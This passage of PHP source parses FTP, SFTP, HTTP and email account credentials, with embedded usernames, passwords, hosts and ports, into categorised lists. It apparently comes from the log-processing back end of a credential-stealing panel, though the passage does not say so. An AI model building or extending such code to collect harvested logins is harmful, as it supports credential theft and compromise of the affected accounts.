				return $FTP_;

			$FTP_ = trim($FTP_);

			if (!strlen($FTP_))
				return '';

			if ($SSH_)
			{
				$p = strpos($FTP_, '://');
				if ($p === false)
					return "sftp://" . $FTP_;
				else
				{
					if (str_begins($FTP_, 'ftp://'))
						$FTP_ = 'sftp://' . substr($FTP_, strlen('FTP_://'));
					return $FTP_;
				}
			}

			return $FTP_;
		}
		
		protected function add_http($Url, $User = "", $Pass = "") //OK
		{
			$this->add_ftp($Url, $User, $Pass, TRUE);
		}
		
		protected function add_ftp($url, $extra_user = "", $extra_pass = "", $http_mode = false) //NOK
		{
			
			$url = trim($url);
			if (strlen($url) == 0 || strtolower($url) == 'ftp://' || strtolower($url) == 'ftps://' || strtolower($url) == 'ftpes://' || strtolower($url) == 'sftp://' || strtolower($url) == 'esftp://' ||
					strtolower($url) == 'http://' || strtolower($url) == 'https://' || strtolower($url) == 'sftp://:22')
				return false;
				
			$extra_user = trim($extra_user);
			$extra_pass = trim($extra_pass);
			if ((strpos($url, '@') === false) && (!strlen(trim($extra_pass)) && (!strlen(trim($extra_user)))))
			{
				return false;
			}
			
			$url_protocol = '';
			if (($p = strpos($url, "://")) !== false)
			{
				$url_protocol = substr($url, 0, $p+3);
				$url = substr($url, $p+3);
			}
			
			
			// fix '#' chars in URL
			$url = str_replace("#", '_bbbbbbbbbbbbbbbb_____', $url);
			
			$p = strrpos($url, "@");
			if ($p !== false)
			{
				$v1 = str_replace("/", '_aaaaaaaaaaaaaaaaaaa____', substr($url, 0, $p));
				$v2 = str_replace("//", "/", str_replace("\\", "/", substr($url, $p)));
				$url = $v1.$v2;
			}
			else
			{
				$url = str_replace('//', '/', str_replace("\\", "/", $url));
			}
			
			$url = $url_protocol.$url;
			if (strpos($url, "://") === false)
			{
				if ($http_mode)
					$url = "http://".$url;
				else
					$url = "ftp://".$url;
			}
			
			// fix ftp:/// urls
			$url = str_replace('ftp:///', 'ftp://', $url);

			error_reporting(0);
			$r = parse_url($url);
			
			error_reporting(E_ALL);
			
			if (is_array($r))
				foreach ($r as $key=>$value)
			{
				$r[$key] = str_replace('_aaaaaaaaaaaaaaaaaaa____', '/', $r[$key]);
				$r[$key] = str_replace('_bbbbbbbbbbbbbbbb_____', '#', $r[$key]);
				
				if (($key == 'host' || $key == 'path') && strpos($r[$key], '#') !== false)
				{
					$r[$key] = substr($r[$key], 0, strpos($r[$key], '#'));
				}
			}
			
			
			
			if ($r && nonempty($r["host"]) && (is_valid_host($r["host"]) || is_valid_ip_filter($r["host"])))
			{
				$r["scheme"] = strtolower(Assign_($r["scheme"]));
				if (($r["scheme"] == "ftp") ||
						($r["scheme"] == "ftps") ||
						($r["scheme"] == "ftpes") ||
						($r["scheme"] == "sftp") ||
						($r["scheme"] == "esftp") ||
						($r["scheme"] == "http" && $http_mode == TRUE) ||
						($r["scheme"] == "https" && $http_mode == TRUE)
				   )
				{
					// specified port
					$port = "";
					if (nonempty($r["port"]) && IsNum($r["port"]))
						$port = $r["port"];

					if ($http_mode == false && $port == "21")
						$port = "";

					if ($http_mode == true && $port == "80")
						$port = "";

					// specified remote ftp directory (path)
					$path = '';
					if(isset($r["path"]))
						$path = $r["path"];
					
					//$path = Assign_($r["path"]);

					$line = "";
					if (nonempty($r["user"]) && nonempty($r["pass"]))
						$line = $this->build_url_line($r["scheme"], $r["user"], $r["pass"], $r["host"], $port, $path, $http_mode);
					if (strlen($line))
					{
						
						if ($http_mode)
							$this->insert_http($line);
						else
						{
							
							$this->insert_ftp($line);
						}
							
					}
					
					$line = "";
					if (strlen($extra_user) && strlen($extra_pass))
						$line = $this->build_url_line($r["scheme"], $extra_user, $extra_pass, $r["host"], $port, $path, $http_mode);
					if (!strlen($extra_user) && strlen($extra_pass) && nonempty($r["user"]))
						$line = $this->build_url_line($r["scheme"], $r['user'], $extra_pass, $r["host"], $port, $path, $http_mode);

					if ($line)
					{
						if ($http_mode)
							$this->insert_http($line);
						else
						{
							$this->insert_ftp($line);
						}
							
					}
					
					return true;
				}
			}
			return false;
		}

		protected function build_url_line($scheme, $user, $pass, $host, $port, $path, $http_mode) //NOK
		{
			if ((!is_valid_host($host) && !is_valid_ip_filter($host)) || !strlen($user) || !strlen($pass) || !strlen($scheme))
				return "";

			if ((strtolower($scheme) == 'sftp'))
				$line = "sftp://".$user.":".$pass;
			else if (strtolower($scheme) == 'http' && $http_mode)
				$line = "http://".$user.":".$pass;
			else if (strtolower($scheme) == 'https' && $http_mode)
				$line = "https://".$user.":".$pass;
			else
			{
				if ($http_mode)
					$line = "http://".$user.":".$pass;
				else
				{
					if (($port == 22))
						$line = "sftp://".$user.":".$pass;
					else
					{
						if (($user == 'root'))
							$line = "sftp://".$user.":".$pass;
						else
							$line = "ftp://".$user.":".$pass;
					}
				}
			}

			$line .= "@".$host;
			$port = strval($port);
			if (strlen($port) && IsNum($port))
			{
				if($port == 22 && strtolower($scheme) == 'sftp')
				{
					
				}
				else
					$line .= ":".$port;
			}
				
			if (strlen($path) && ($path[0] == "/") && ($path != "/"))
				$line .= $path;
			return $line;
		}

		protected function add_email($Email, $Prot, $Server, $Port, $User, $Pass) //OK
		{
			$Email 	= trim($Email);
			$Prot 	= strtolower(trim($Prot));
			$Server = trim($Server);
			$User 	= trim($User);
			$Pass 	= trim($Pass);
			$Port 	= strval(intval(trim($Port)));

			if(strlen($Prot))
			{
				if ($Prot != 'smtp' && $Prot != 'imap' && $Prot != 'pop3' && $Prot != 'http' && $Prot != '-')
					return FALSE;
			}
			
			if (!strlen($Pass))
				return FALSE;
			
			if(!strlen($User))
			{
				if(!strlen($Email))
					return FALSE;
				
				$User = $Email;
			}
			
			if ($Port == '0')
				$Port = '';
			
			$SPort = '';
			if(strlen($Server))
			{
				$PortPos = strpos($Server, ':');
				if ($PortPos !== false)
				{
					if ($Port == '')
					{
						$Port = strval(intval(trim(substr($Server, $PortPos+1))));
						if ($Port == '0')
							$Port = '';
					} 
					else
					{
						$SPort = strval(intval(trim(substr($Server, $PortPos+1))));
						if ($SPort == '0')
							$SPort = '';
					}
					
					$Server = substr($Server, 0, $PortPos);
				}
				
				if (!is_valid_host($Server) && !is_valid_ip_filter($Server))
					return FALSE;
			}
			
			switch ($Prot)
			{
				case 'smtp':
				
					if ($Port == '25')
						$Port = '';
					
					if ($SPort == '25')
						$SPort = '';
					
					break;
				case 'imap':
				
					if ($Port == '143')
						$Port = '';
					
					if ($SPort == '143')
						$SPort = '';
					
					break;
				case 'pop3':
				
					if ($Port == '110')
						$Port = '';
					
					if ($SPort == '110')
						$SPort = '';
					
					break;
				case 'http':
				
					if ($Port == '80')
						$Port = '';
					
					if ($SPort == '80')
						$SPort = '';
					
					break;
			}
			
			$this->insert_mail(array('EM'=> $Email, 'PR'=> $Prot, 'SE'=> $Server, 'PO'=>  $Port, 'US'=> $User, 'PW'=> $Pass));

			if (strlen($SPort))
				$this->insert_mail(array('EM'=> $Email, 'PR'=> $Prot, 'SE'=> $Server, 'PO'=> $SPort, 'US'=> $User, 'PW'=> $Pass));
			
			return TRUE;
		}
		protected function insert_ftp($ftp_formatted)
		{
			$ftp_formatted = trim($ftp_formatted);
			if (strlen($ftp_formatted) == 0)
				return;

			array_push($this->FTP_, $ftp_formatted);
		}
		protected function insert_http($http_formatted)
		{
			$http_formatted = trim($http_formatted);
			if (strlen($http_formatted) == 0)
				return;

			array_push($this->HTTP_, $http_formatted);
		}
		protected function insert_mail($mail_array)
		{
			$mail_formatted = trim(json_encode($mail_array));
			if (strlen($mail_formatted) == 0)
				return;

			array_push($this->MAIL_, $mail_formatted);
		}
		protected function insert_other($other_formatted)
		{
			$other_formatted = trim($other_formatted);
			if (strlen($other_formatted) == 0)
				return;

			array_push($this->OTHER_, $other_formatted);
		}
		protected function insert_downloads($download_name, $download_buffer) //0 == DB, 1 == FILE
		{
			$download_name = trim($download_name);
			if (strlen($download_name) == 0 || strlen($download_buffer) < 2)
				return;

			$download_name = str_replace(" ", "_", $download_name);
			$download_name = str_replace("\r", "", $download_name);
			$download_name = str_replace("\n", "", $download_name);
			
			array_push($this->DOWNLOADS_, array($download_name, $download_buffer));
		}
		protected function insert_wrong($wrong_formatted)
		{
			array_push($this->WRONG_, $wrong_formatted);
		}
		
		protected function set_options($Settings, $Value)
		{
			$this->Options[__CLASS__][$Settings] = $Value;
		}
		protected function unset_options($Settings)
		{
			$this->Options[__CLASS__][$Settings] = NULL;
		}
		
		protected function get_options($Settings)
		{
			if(isset($this->Options[__CLASS__][$Settings]))
			{
				return $this->Options[__CLASS__][$Settings];
			}
			
			return NULL;
		}
	}
